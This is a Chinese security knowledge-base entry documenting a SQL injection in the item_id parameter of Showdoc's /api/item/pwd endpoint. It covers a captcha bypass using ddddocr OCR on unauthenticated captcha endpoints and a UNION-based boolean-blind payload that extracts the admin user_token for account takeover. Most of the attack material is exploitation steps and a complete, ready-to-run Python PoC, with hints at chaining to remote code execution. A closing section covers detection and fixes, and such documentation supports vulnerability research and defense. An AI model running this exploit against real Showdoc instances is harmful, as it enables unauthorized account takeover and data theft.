---
id: web-generic-sqli-showdoc-item-pwd-item-id-union-captcha-ocr-user-token
title: Showdoc < 3.2.6 item/pwd 的 item_id 拼接注入：接口自取验证码 + OCR 识别，UNION 布尔盲注外带 user_token
type: scenario
domain: web
path: web/generic/sqli
technique: showdoc-item-pwd-item-id-union-captcha-ocr-token-extraction
tags:
- web
- sqli
- showdoc
- union
- boolean-blind
- captcha
- ocr
- token-leak
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
affected_versions: Showdoc < 3.2.6
verification:
  verified_by: verifier-V342
  verified_at: '2026-11-08T20:51:18+08:00'
  notes: 已对照原文及18张图片核对：通告截图明确 ShowDoc<3.2.6；v3.2.6 diff 将 item_id 改为 %d 参数化；createCaptcha/showCaptcha 双接口可取 captcha_id 与图片；ddddocr 脚本输出 token 前缀；checkLogin 直接信任 user_token 请求参数/cookie。PoC 与 error_code 0/10010/10206 三分支与原文一致。未本机实测。
url: /docs/web/generic/sqli/web-generic-sqli-showdoc-item-pwd-item-id-union-captcha-ocr-user-token/
draft: false
kb_aliases:
- Showdoc SQL 注入
- Showdoc item_id 注入
- /api/item/pwd 注入
- ddddocr 验证码识别
- user_token 盲注外带
- Showdoc 3.2.5 注入
---

## 一句话结论

Showdoc 3.2.6 之前的 `/server/index.php?s=/api/item/pwd` 把 `item_id` 直接拼进 SQL；接口虽然要求验证码，但 `captcha_id` 与验证码图片都由未鉴权的 API 下发、图片只是简单数字，可用 ddddocr 自动识别，随后用 UNION 把 `user_token` 表内容构造成布尔 oracle，逐字符外带管理员 token。

## 原理

- **注入点**：`ItemController::pwd()` 中 `$item = D("Item")->where("item_id = '$item_id'")->find();`，`item_id` 来自请求参数直接拼进 WHERE 子句（单引号可闭合）；v3.2.6 修复为 `where("item_id = '%d'", array($item_id))`，即强制整型/参数化，说明漏洞根因就是字符串拼接。
- **验证码为什么挡不住自动化**：`pwd()` 用 `D("Captcha")->check($captcha_id, $captcha)` 校验，失败返回 `error_code=10206`；但 `captcha_id` 由 `GET ?s=/api/common/createCaptcha` 直接返回，验证码图片由 `GET ?s=/api/common/showCaptcha&captcha_id=<id>` 直接返回，两个接口都不需要登录，且验证码是易 OCR 的数字图片，脚本用 ddddocr 逐个识别即可持续通过校验。
- **布尔 oracle 的构造**：把 `item_id` 注入为 `aa') UNION SELECT 1,1,1,1,1,(SELECT 1 FROM user_token WHERE uid = 1 AND token LIKE '{已猜前缀}{ch}%' LIMIT 1),1,1,1,1,1,1 FROM user_token; -- `。子查询命中时 UNION 返回行、`error_code=0`；不命中时结果为空、进入「访问密码不正确」分支返回 `error_code=10010`。据此对十六进制字符集 `0123456789abcdef` 逐位枚举，即可按前缀恢复 64 位 token。
- **token 为什么等于账号**：Showdoc 的 `checkLogin()` 在无 session 时从 `I('user_token')`（请求参数）或 `cookie('cookie_token')` 取 token，`D('UserToken')->getToken($user_token)` 查到记录且 `token_expire > time()` 即把对应用户载入 session；因此 SQL 注入读出的 token 可以直接作为登录凭证接管该用户（管理员 token 即后台/前台全部权限）。

## 触发条件

- Showdoc < 3.2.6，`/server/index.php` 可访问，`/api/item/pwd` 公开可调（需要密码访问的文档项场景）。
- 验证码接口可达且验证码可被 OCR 稳定识别（简单数字、无强干扰）；识别失败时服务端返回 10206，可重试。
- `user_token` 表中存在目标用户（如 uid=1 管理员）且未过期的 token；token 为十六进制字符串。
- 注入点未被 WAF 拦截（`UNION SELECT`、`LIKE` 等关键字需按目标环境绕过）。

## 利用步骤

1. 访问 `GET /server/index.php?s=/api/common/createCaptcha` 取得 `captcha_id`。
2. 访问 `GET /server/index.php?s=/api/common/showCaptcha&captcha_id=<id>` 取验证码图片，用 ddddocr（可限定 `0123456789abcdef` 字符集）识别出文本。
3. 发送注入请求：`GET /server/index.php?s=/api/item/pwd&page_id=0&password=1&captcha_id=<id>&captcha=<text>&item_id=<payload>`。
4. 按 `error_code` 判定：0=当前字符命中，10010=不命中，10206=验证码错误需重取重试；从第一个字符开始逐位枚举，约 64 轮恢复完整 token。
5. 把 token 作为 `user_token` 参数（或 `cookie_token` Cookie）调用任意需要登录的接口，即获得该用户身份；后续可配合上传、文档读取等功能继续利用。

## PoC

```python
import requests, ddddocr

base = "http://target/server/index.php"
ocr = ddddocr.DdddOcr()
ocr.set_ranges("0123456789abcdef")

def probe(prefix, ch):
    cid = requests.get(base, params={"s": "/api/common/createCaptcha"}).json()["data"]["captcha_id"]
    img = requests.get(base, params={"s": "/api/common/showCaptcha", "captcha_id": cid}).content
    code = ocr.classification(img)
    inj = ("aa') UNION SELECT 1,1,1,1,1,"
           f"(SELECT 1 FROM user_token WHERE uid = 1 AND token LIKE '{prefix}{ch}%' LIMIT 1),"
           "1,1,1,1,1,1 FROM user_token; -- ")
    r = requests.get(base, params={"s": "/api/item/pwd", "page_id": "0", "password": "1",
                                   "captcha_id": cid, "captcha": code, "item_id": inj}).json()
    return r["error_code"]   # 0 命中 / 10010 不命中 / 10206 验证码错

token = ""
for _ in range(64):
    for ch in "0123456789abcdef":
        rc = probe(token, ch)
        if rc == 0:
            token += ch
            break
        while rc == 10206:          # 验证码识别失败则重试同一字符
            rc = probe(token, ch)
    else:
        break
print(token)
```

## 变体与关联

- **其他注入形态**：若 UNION 被拦截，可改用报错注入或时间盲注构造同一 oracle；`error_code` 的差异（0/10010）本身也可换成基于响应长度、页面内容的布尔判断。
- **目标用户扩展**：`uid=1` 只是管理员示例，`user_token` 表按 uid 存放，可枚举任意已登录用户；同一用户可能有多个未过期 token。
- **验证码侧**：`captcha_id` 一次性、按会话校验的强度决定 OCR 重试成本；若识别率低可改用打码平台或本地训练模型。
- **关联**：`checkLogin()` 同时信任请求参数与 Cookie 中的 token，且还存在 `where("uid = $ret[uid]")` 这类字符串拼接的同类隐患（未在本链展开）；通用「客户端 token 参数受信导致 token 泄露即账号接管」模式与本链的 token 使用方式一致。
- **后续利用**：拿到 token 后可访问 `/api/page/upload` 等登录后接口，与 Showdoc PHAR 反序列化链衔接可进一步 RCE。

## 检测与防御

- 全部 SQL 使用参数化查询；`item_id` 之类标识符强制整型（`intval`/`%d`），禁止把请求参数拼进 `where` 字符串。
- 验证码与一次性会话/客户端绑定并服务端校验，限制同一 IP/会话的验证尝试频率；避免提供可被直接抓取的简单数字验证码（或加噪点、滑动验证、行为风控）。
- 不接受长期 token 作为可重复登录凭证；token 绑定会话/设备、短过期、可撤销，禁止从 URL 参数读取 token（改走 Authorization 头并配 HTTPS）。
- 监控异常：短时间大量 `createCaptcha/showCaptcha` 请求、同一验证码接口被高频调用、`item_id` 中出现引号/UNION/LIKE 等关键字，以及同一 token 从多个 IP 使用。

